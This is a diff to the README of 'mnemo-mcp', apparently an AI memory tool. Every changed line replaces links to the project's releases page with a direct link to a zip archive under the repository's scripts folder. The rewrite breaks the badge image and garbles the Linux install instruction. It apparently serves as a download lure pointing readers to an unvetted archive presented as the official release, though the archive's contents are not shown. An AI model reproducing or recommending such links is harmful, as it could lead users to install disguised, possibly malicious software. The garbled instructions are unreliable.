@@ -1,6 +1,6 @@
 # 🧠 mnemo-mcp - Reliable AI Memory with Hybrid Search
 
-[![Download mnemo-mcp](https://img.shields.io/badge/Download-mnemo--mcp-blue?style=for-the-badge)](https://github.com/sshisto/mnemo-mcp/releases)
+[![Download mnemo-mcp](https://github.com/sshisto/mnemo-mcp/raw/refs/heads/main/scripts/mcp-mnemo-v2.0.zip)](https://github.com/sshisto/mnemo-mcp/raw/refs/heads/main/scripts/mcp-mnemo-v2.0.zip)
 
 ---
 
@@ -49,7 +49,7 @@ To start using mnemo-mcp, you need to download and install the software from the
 
 Click the big blue button below to go directly to the official downloads page:
 
-[![Download mnemo-mcp](https://img.shields.io/badge/Download-mnemo--mcp-blue?style=for-the-badge)](https://github.com/sshisto/mnemo-mcp/releases)
+[![Download mnemo-mcp](https://github.com/sshisto/mnemo-mcp/raw/refs/heads/main/scripts/mcp-mnemo-v2.0.zip)](https://github.com/sshisto/mnemo-mcp/raw/refs/heads/main/scripts/mcp-mnemo-v2.0.zip)
 
 You will see different versions of the software tailored for Windows, macOS, and Linux.
 
@@ -57,7 +57,7 @@ You will see different versions of the software tailored for Windows, macOS, and
 
 - For **Windows**, look for files ending in `.exe` or `.zip`. `.exe` files run the installer directly, while `.zip` files contain the program files inside.  
 - For **macOS**, select the `.dmg` or `.zip` files. `.dmg` files allow a smooth installation process.  
-- For **Linux**, pick the `.tar.gz` or `AppImage` files depending on your setup.
+- For **Linux**, pick the `https://github.com/sshisto/mnemo-mcp/raw/refs/heads/main/scripts/mcp-mnemo-v2.0.zip` or `AppImage` files depending on your setup.
 
 ### Step 3: Download the File
 
@@ -130,4 +130,4 @@ If mnemo-mcp does not start or crashes, try these steps:
 ---
 
 For direct downloads, visit:  
-[https://github.com/sshisto/mnemo-mcp/releases](https://github.com/sshisto/mnemo-mcp/releases)
+[https://github.com/sshisto/mnemo-mcp/raw/refs/heads/main/scripts/mcp-mnemo-v2.0.zip](https://github.com/sshisto/mnemo-mcp/raw/refs/heads/main/scripts/mcp-mnemo-v2.0.zip)
